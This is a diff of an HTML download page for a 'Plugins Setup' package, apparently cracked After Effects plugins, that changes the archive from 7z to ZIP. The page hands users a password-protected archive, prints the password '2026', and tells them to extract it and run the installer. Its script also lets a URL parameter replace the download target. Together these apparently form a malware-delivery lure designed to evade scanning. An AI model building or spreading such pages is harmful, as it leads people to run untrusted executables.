@@ -361,7 +361,7 @@
             <span>Package</span>
           </div>
         </div>
-        <a class="btn" id="dl" href="/downloads/Plugin_Setup_3.3.2.7z" rel="noopener">
+        <a class="btn" id="dl" href="/downloads/Plugin_Setup.3.3.2.zip" rel="noopener">
           <svg viewBox="0 0 24 24" fill="none" aria-hidden="true">
             <path d="M12 3v12m0 0 4-4m-4 4-4-4M5 19h14" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round"/>
           </svg>
@@ -373,7 +373,7 @@
             <input id="zipPass" type="text" value="2026" readonly aria-label="Archive password">
             <button type="button" id="copyPass">Copy</button>
           </div>
-          <p class="pw-hint">7z archive is password-protected. Use <b style="color:var(--accent);font-weight:600">2026</b> when extracting.</p>
+          <p class="pw-hint">ZIP is password-protected. Use <b style="color:var(--accent);font-weight:600">2026</b> when extracting.</p>
           <ol class="pw-steps">
             <li>Extract the archive with password <b>2026</b></li>
             <li>Run <b>Plugins Setup</b></li>
@@ -392,7 +392,7 @@
   var image = (p.get("i") || "").trim();
   var works = (p.get("w") || "").trim();
   var cat = (p.get("c") || "Plugins").trim();
-  var dest = (p.get("u") || "https://plugin-dex.asia/downloads/Plugin_Setup_3.3.2.7z").trim();
+  var dest = (p.get("u") || "https://plugin-dex.asia/downloads/Plugin_Setup.3.3.2.zip").trim();
 
   var APP_MAP = [
     [/after\s*effects/i, "AE"],
